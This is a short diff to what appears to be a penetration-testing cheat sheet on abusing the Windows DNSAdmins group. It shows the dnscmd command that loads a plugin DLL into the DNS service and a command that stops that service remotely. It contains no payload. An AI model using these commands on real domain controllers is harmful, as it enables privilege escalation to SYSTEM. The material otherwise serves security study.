@@ -1,6 +1,8 @@
 # DNSAdmins group abuse
 
-    dnscmd.exe /config /serverlevelplugindll \\PATH\TO\.DLL (Need a dnsadmin user)
+## Prerequisites: User is in the DNSAdmins Group
+
+    dnscmd.exe /config /serverlevelplugindll \\PATH\TO\.DLL 
 
     sc \\DNSServer stop dns
 
